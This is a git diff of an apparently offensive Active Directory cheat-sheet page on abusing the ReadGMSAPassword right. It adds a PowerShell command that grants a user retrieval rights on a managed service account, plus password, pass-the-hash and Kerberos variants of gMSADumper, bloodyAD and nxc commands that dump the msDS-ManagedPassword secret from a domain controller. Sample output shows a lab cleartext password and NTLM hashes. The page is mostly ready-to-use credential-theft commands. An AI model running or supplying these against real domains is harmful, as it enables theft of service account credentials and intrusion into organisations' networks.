@@ -1,17 +1,26 @@
 ---
 title: "ReadGMSAPassword"
-date: 2024-7-23
+date: 2025-3-31
 tags: ["Credential Dumping", "ReadGMSApassword", "Gmsadumper", "Active Directory", "Windows"]
 ---
 
 ### Abuse #1: Read GMSAPassword (From Linux)
 
+#### 1. Set Allowed to Retrieve the Password for this MSA \[Optional\]
+
+```console
+Set-ADServiceAccount -Identity "<TARGET_IDENTITY>" -PrincipalsAllowedToRetrieveManagedPassword "<USER>"
+```
+
+#### 2. Read GMSA Password
+
 {{< tab set1 tab1 >}}gMSADumper{{< /tab >}}
-{{< tab set1 tab2 >}}BloodyAD{{< /tab >}}
+{{< tab set1 tab2 >}}bloodyAD{{< /tab >}}
 {{< tab set1 tab3 >}}nxc{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 ```console
+# Password
 python3 gMSADumper.py -u '<USER>' -p '<PASSWORD>' -l <DC> -d <DOMAIN>
 ```
 
@@ -26,6 +35,12 @@ svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3
 ```
 
 ```console
+# NTLM
+python3 gMSADumper.py -u '<USER>' -p '<LM_HASH>:<NT_HASH>' -l <DC> -d <DOMAIN>
+```
+
+```console
+# Kerberos
 python3 gMSADumper.py -k -l <DC> -d <DOMAIN>
 ```
 
@@ -35,6 +50,7 @@ python3 gMSADumper.py -k -l <DC> -d <DOMAIN>
 {{< tabcontent set1 tab2 >}}
 
 ```console
+# Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
 ```
 
@@ -46,12 +62,23 @@ msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:80d4ea8c2d5ccfd1ebac
 msDS-ManagedPassword.B64ENCODED: wcVVmCKWYOZszus92zsZDFqtPFYu960EdHowLnWB5vChR4R/yj+hgVusvxgnG1OYREO70qnEiCEfP62qLZluS/UHz53T94CItJ+YxA6W5jiWTy0L03JgE1m87NCnxrzGSXHXjp4Ja1OKDde9RrIaqGN7C7cFZth05q1bOOO+x8+jdD1xRXHKgig5LDk4inLQ1xqu7Lc4vT/hIIPx2dbS0FNwGtKu2NTTVAAB/LgVwYnfMNkpti2T0cE8R12HzjGVLV/54GLU1O8iLyXdnfgAQUdnccIlSacJ3XItjjeTWuOwCKQKmc0o8BbE+rHjA5dotmBiBHsE9bw3YsCh0SNTeA==
 ```
 
+```console
+# NTLM
+bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+```
+
+```console
+# Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -k ccache='<USER>.ccache' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+```
+
 <small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab3 >}}
 
 ```console
+# Password
 nxc ldap -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> <DC> --gmsa
 ```
 
@@ -61,6 +88,16 @@ SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019
 LDAPS       10.10.10.248    636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
 LDAPS       10.10.10.248    636    DC               [*] Getting GMSA Passwords
 LDAPS       10.10.10.248    636    DC               Account: svc_int$             NTLM: 80d4ea8c2d5ccfd1ebac5bd732ece5e4
+```
+
+```console
+# NTLM
+nxc ldap -u '<USER>' -H '<HASH>' -d <DOMAIN> <DC> --gmsa
+```
+
+```console
+# Kerberos
+nxc ldap -u '<USER>' -k --use-kcache -d <DOMAIN> <DC> --gmsa
 ```
 
 {{< /tabcontent >}}
@@ -73,7 +110,7 @@ LDAPS       10.10.10.248    636    DC               Account: svc_int$           
 {{< tabcontent set2 tab1 >}}
 
 ```console
-$gmsa = Get-ADServiceAccount -Identity '<TARGET_NAME>' -Properties 'msDS-ManagedPassword'
+$gmsa = Get-ADServiceAccount -Identity '<TARGET_IDENTITY>' -Properties 'msDS-ManagedPassword'
 ```
 
 ```console {class="sample-code"}
